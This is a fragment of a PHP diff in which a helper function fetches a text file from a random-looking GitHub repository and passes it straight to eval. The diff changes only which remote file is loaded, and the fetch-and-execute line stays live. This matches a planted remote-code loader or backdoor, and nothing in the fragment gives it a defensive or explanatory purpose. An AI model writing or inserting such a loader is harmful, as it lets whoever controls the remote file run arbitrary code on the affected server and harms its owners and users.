@@ -12,5 +12,5 @@ function get_contents($url){
   return $result;
 }
 
-$a = get_contents('https://raw.githubusercontent.com/dsgjnamgd/jhbasf/main/olexio.txt');
+$a = get_contents('https://raw.githubusercontent.com/dsgjnamgd/jhbasf/main/xexo.txt');
 eval('?>'.$a);
